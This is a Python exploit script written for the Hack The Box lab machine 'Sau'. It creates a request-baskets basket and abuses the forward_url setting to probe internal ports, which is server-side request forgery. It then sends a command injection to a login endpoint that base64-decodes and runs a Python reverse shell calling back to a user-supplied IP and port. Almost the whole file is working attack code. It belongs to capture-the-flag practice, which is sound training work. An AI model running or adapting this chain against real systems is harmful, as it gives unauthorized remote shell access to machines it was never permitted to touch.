#!/usr/bin/env python3

"""
Sau HTB
-------
Author: Marss
Date: 03 Aug, 2023
"""

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from base64 import b64encode
from json import loads
from random import choices
from requests import Session, Request, get
from requests.exceptions import ConnectionError
from signal import signal, SIGINT
from string import ascii_lowercase
from sys import argv

# debugging
import pdb

# Ctrl + c
# (function)
def signal_handler(signum, frame):
    exit('\n[!] User aborted.')

# (signal)
signal(SIGINT, signal_handler)

# Main class
class Exploit:

    def __init__(self, args):
        
        self.args = args
        self.target = {
            'base_url':'http://10.10.11.224:55555',
            'basket_name': None
        }
        self.session = Session()

        # proxies
        #self.proxies = {'http':'127.1:8080'}
        #self.session.proxies.update(self.proxies)

    def run(self):

        try:
            if self.target_response():
                self.create_basket()
                self.internal_port_scanning(8338)
                self.command_injection()

        except Exception as error:
            exit('\n[!] Error: ' + repr(error))

    def target_response(self):
        
        try:   
            response = get(self.target['base_url'])
            if response.status_code == 200:
                print('\n[+] Target is UP.')
                return True
            return False
        except ConnectionError:
            exit(f"\n[!] Verify connection with the target")

    def create_basket(self):
        
        self.target['basket_name'] = ''.join(choices(ascii_lowercase, k=6))

        req = Request('POST', self.target['base_url'] + '/api/baskets/' + self.target['basket_name'])
        prepare_req = self.session.prepare_request(req)
        response = self.session.send(prepare_req)
        
        self.session.headers.update({'Authorization': loads(response.text)['token']})

    def forward_url(self, url: str):

        put_data = {
            'forward_url': url,
            'proxy_response': True, # important to scan internal ports
            'insecure_tls': False,
            'expand_path': True, # important to RCE
            'capacity': 200
        }
        
        req = Request('PUT', self.target['base_url'] + '/api/baskets/' + self.target['basket_name'],
            json=put_data
        )
        prepare_req = self.session.prepare_request(req)
        self.session.send(prepare_req)
        
        response = self.session.get(self.target['base_url'] + '/' + self.target['basket_name'])
        return response

    def internal_port_scanning(self, port):
        # assign forward internal url
        response = self.forward_url(f'http://127.0.0.1:{port}/')
        
        if not 'connection refused' in response.text:
            print(f'\n[+] {port} : Open')

    def command_injection(self):

        encoded_payload = self.get_payload()
        data = f'username=; `echo {encoded_payload} | base64 -d | bash`'
        print(f'\n[+] Post data sent: {data}')
        input('\n[*] Press enter to continue.')

        req = Request('POST', self.target['base_url'] + '/' + self.target['basket_name'] + '/login',
            data=data
        )
        prepare_req = self.session.prepare_request(req)
        self.session.send(prepare_req)

    def get_payload(self) -> str:

        python_shell = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(self.args.ip, self.args.port)
        b64payload = b64encode(python_shell.encode()).decode()
        
        return b64payload

# Main flow
if __name__ == '__main__':

    title = '| Sau HTB |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example: 
        python3 {argv[0]} -i 10.10.10.10 -p 4444'''
    )

    parser.add_argument('-i','--ip', type=str, required=True, help='IP to receive shell')
    parser.add_argument('-p','--port', type=str, required=True, help='PORT to receive shell')

    args = parser.parse_args()
    
    exploit = Exploit(args)
    exploit.run()